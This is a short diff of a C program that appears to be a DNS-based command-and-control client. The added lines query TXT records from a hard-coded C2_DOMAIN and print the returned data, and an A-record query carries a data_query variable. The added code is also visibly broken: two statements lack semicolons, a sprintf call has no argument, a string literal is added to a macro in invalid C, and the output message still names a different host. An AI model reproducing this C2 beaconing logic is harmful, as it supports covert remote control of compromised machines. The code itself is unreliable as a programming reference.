@@ -36,24 +36,27 @@ int main(int argc, char **argv) {
 
     (void)query_a(data_query);
 
-    // txt_results = query_txt(hostname);
+    unsigned char query[1024 + 33 + 257]
+    sprintf(query, "%s")
 
-    // if(txt_results) {
-    //     printf("TXT records for %s:\n\n", hostname);
+    unsigned char *txt_results = query_txt("test" + C2_DOMAIN);
 
-    //     for(i = 0; txt_results[i] != NULL; i++) {
-    //         printf("TXT %d\n", i);
-    //         printf("Data: %s\n", txt_results[i]);
+    if(txt_results) {
+        printf("TXT records for %s:\n\n", hostname);
 
-    //         //Free each string
-    //         free(txt_results[i]);
-    //     }
+        for(i = 0; txt_results[i] != NULL; i++) {
+            printf("TXT %d\n", i);
+            printf("Data: %s\n", txt_results[i]);
 
-    //     //Free the array itself
-    //     free(txt_results);
-    // } else {
-    //     printf("Failed to query TXT record for %s\n", hostname);
-    // }
+            //Free each string
+            free(txt_results[i]);
+        }
+
+        //Free the array itself
+        free(txt_results);
+    } else {
+        printf("Failed to query TXT record for %s\n", hostname);
+    }
 
     // a_results = query_a(hostname);
 
